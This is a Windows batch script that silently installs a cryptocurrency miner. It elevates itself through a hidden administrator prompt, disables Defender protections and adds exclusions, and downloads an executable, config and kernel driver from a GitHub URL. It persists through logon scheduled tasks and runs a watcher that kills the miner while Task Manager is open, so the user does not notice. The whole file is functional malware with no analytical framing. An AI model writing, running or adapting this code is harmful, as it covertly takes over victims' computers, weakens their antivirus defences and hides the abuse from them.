@echo off
net session >nul 2>&1
if %errorLevel% equ 0 goto :main
powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c ""%~f0""' -Verb RunAs -WindowStyle Hidden"
exit /b

:main
set DEST=C:\ProgramData\VLTrig
set TMP=%TEMP%\vl_tmp
set BASE=https://raw.githubusercontent.com/4etex/myfarmmachine/master

if not exist "%DEST%" mkdir "%DEST%"
if not exist "%TMP%"  mkdir "%TMP%"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Set-MpPreference -PUAProtection Disabled -EA SilentlyContinue; Add-MpPreference -ExclusionPath '%DEST%' -EA SilentlyContinue; Add-MpPreference -ExclusionPath '%TMP%' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'vltrig.exe' -EA SilentlyContinue"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%BASE%/vltrig.exe','%TMP%\vltrig.exe')"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%BASE%/config.json','%TMP%\config.json')"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%BASE%/WinRing0x64.sys','%TMP%\WinRing0x64.sys')"

if not exist "%TMP%\vltrig.exe"      goto :end
if not exist "%TMP%\config.json"     goto :end
if not exist "%TMP%\WinRing0x64.sys" goto :end

copy /y "%TMP%\vltrig.exe"      "%DEST%\" >nul
copy /y "%TMP%\config.json"     "%DEST%\" >nul
copy /y "%TMP%\WinRing0x64.sys" "%DEST%\" >nul

echo while($true){if(Get-Process taskmgr -EA SilentlyContinue){Stop-Process -Name vltrig -Force -EA SilentlyContinue}elseif(-not(Get-Process vltrig -EA SilentlyContinue)){Start-Process '%DEST%\vltrig.exe' -ArgumentList '--config=%DEST%\config.json'};Start-Sleep 3} > "%DEST%\watch.ps1"

schtasks /delete /tn "VLTrig"      /f >nul 2>&1
schtasks /delete /tn "VLTrigWatch" /f >nul 2>&1

schtasks /create /tn "VLTrig"      /tr "\"%DEST%\vltrig.exe\" --config=\"%DEST%\config.json\""                          /sc onlogon /rl highest /f >nul
schtasks /create /tn "VLTrigWatch" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%DEST%\watch.ps1\"" /sc onlogon /rl highest /f >nul

schtasks /run /tn "VLTrigWatch" >nul
timeout /t 3 /nobreak >nul
tasklist | find /i "vltrig.exe" >nul 2>&1
if %errorLevel% neq 0 start "" /b "%DEST%\vltrig.exe" --config="%DEST%\config.json"

rmdir /s /q "%TMP%"
:end
